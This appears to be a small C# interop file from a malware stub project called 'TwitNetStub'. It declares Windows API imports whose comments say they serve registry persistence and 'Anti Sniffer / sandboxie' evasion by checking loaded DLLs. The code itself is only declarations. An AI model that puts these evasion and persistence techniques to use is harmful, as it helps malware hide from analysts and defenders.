using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;

namespace TwitNetStub.Util.Misc
{
    class Interop
    {
        /// <summary>
        /// Retreive the short path name (8.3 Filename), used to set the path of the file in the Windows Registry
        /// </summary>
        /// <param name="path">Path of file</param>
        /// <param name="shortPath">Stringbuilder to store the short path in</param>
        /// <param name="shortPathLength">Length of stringbuilder used</param>
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern int GetShortPathName([MarshalAs(UnmanagedType.LPTStr)] string path,
           [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath, int shortPathLength);

        /// <summary>
        /// Holds the 8.3 (short) filename
        /// </summary>
        public static string ShortPath = null;

        /// <summary>
        /// Used to check the dll's loaded in the process (Anti Sniffer / sandboxie)
        /// </summary>
        /// <param name="lpModuleName">DLL to check for</param>
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
